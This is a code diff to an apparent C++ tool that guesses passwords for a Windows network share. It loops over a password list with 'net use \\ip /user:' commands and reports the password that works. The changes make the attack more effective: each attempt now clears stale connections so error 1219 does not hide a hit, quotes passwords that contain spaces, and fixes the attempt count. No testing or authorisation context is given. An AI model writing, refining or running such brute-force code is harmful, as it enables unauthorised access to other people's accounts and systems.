@@ -44,18 +44,30 @@ bool executeCommand(const std::string& command) {
 
 // Function to process a small batch directly (non-recursive)
 void processSmallBatch(const std::vector<std::string>& batch, const std::string& ip, const std::string& user) {
+    // Make sure we start from a clean slate: a stale connection from a previous
+    // run (or a previous password attempt) causes Windows to reject the NEXT
+    // attempt with error 1219 ("multiple connections... not allowed"), which
+    // looks identical to a wrong password but isn't actually testing anything.
+    std::string cleanupCommand = "net use \\\\" + ip + " /delete /y";
+    executeCommand(cleanupCommand);
+
     for (size_t i = 0; i < batch.size(); ++i) {
+        // Quote the password: net use splits on whitespace otherwise, so any
+        // password containing a space would silently corrupt the command line
+        // and never actually get tested.
         const std::string& password = batch[i];
-        
-        // Attempt to connect with the current password
-        std::string command = "net use \\\\" + ip + " /user:" + user + " " + password;
-        std::cout << "[Attempt " << batchAttemptCount << "] Trying password: " << password << std::endl;
+        std::string command = "net use \\\\" + ip + " /user:" + user + " \"" + password + "\"";
+        std::cout << "[Attempt " << batchAttemptCount++ << "] Trying password: " << password << std::endl;
 
         if (executeCommand(command)) {
             passwordFound = true;
             std::cout << "Password Found: " << password << std::endl;
             break;
         }
+
+        // Release the connection so the next attempt starts clean instead of
+        // hitting error 1219 regardless of whether this password was right.
+        executeCommand(cleanupCommand);
     }
 }
 
